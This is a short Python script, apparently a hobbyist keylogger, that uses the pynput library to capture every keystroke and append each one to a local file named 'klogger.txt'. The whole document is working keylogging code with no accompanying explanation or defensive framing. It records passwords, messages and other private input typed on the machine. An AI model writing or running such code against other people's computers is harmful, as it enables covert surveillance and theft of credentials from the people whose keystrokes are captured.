import pynput.keyboard as Keybaord
from pynput.keyboard import Listener

keys = []

def on_press(key):

    keys.append(key)
    write_file(keys)

def write_file(keys):

    with open('klogger.txt', 'w') as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k)
            f.write("\n")

with Listener(on_press=on_press) as listener:
    listener.join()